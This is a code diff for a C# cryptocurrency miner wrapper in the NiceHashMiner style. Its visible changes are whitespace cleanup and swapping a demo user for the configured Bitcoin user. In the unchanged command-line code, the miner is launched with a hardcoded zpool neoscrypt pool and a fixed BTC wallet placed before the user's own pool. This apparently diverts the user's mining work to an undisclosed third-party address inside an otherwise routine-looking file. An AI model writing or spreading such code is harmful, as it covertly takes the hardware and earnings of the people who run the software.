@@ -23,7 +23,7 @@ namespace NiceHashMiner.Miners
 
         protected override int GetMaxCooldownTimeInMilliseconds()
         {
-            return 60 * 1000 * 10; 
+            return 60 * 1000 * 10;
         }
 
         public override void Start(string url, string btcAdress, string worker)
@@ -90,7 +90,7 @@ namespace NiceHashMiner.Miners
 
             string CommandLine = " --url=stratum+tcp://neoscrypt.eu.mine.zpool.ca:4233" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
                 " --url=" + url +
-                                  " --user=" + Globals.DemoUser +
+                                  " --user=" + Globals.GetBitcoinUser() +
                           " -p x " +
                                   ExtraLaunchParametersParser.ParseForMiningSetup(
                                                                 MiningSetup,
@@ -215,13 +215,13 @@ namespace NiceHashMiner.Miners
                 {
                     CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                     Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from hsrminer reason: " + ex.Message);
-                    return null; 
+                    return null;
                 }
                 catch (InvalidOperationException ex)
                 {
                     CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                     Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from hsrminer reason: " + ex.Message);
-                    return null; 
+                    return null;
                 }
 
                 var totalSpeed = 0.0d;
@@ -243,5 +243,5 @@ namespace NiceHashMiner.Miners
     }
 
 }
-    
+
 
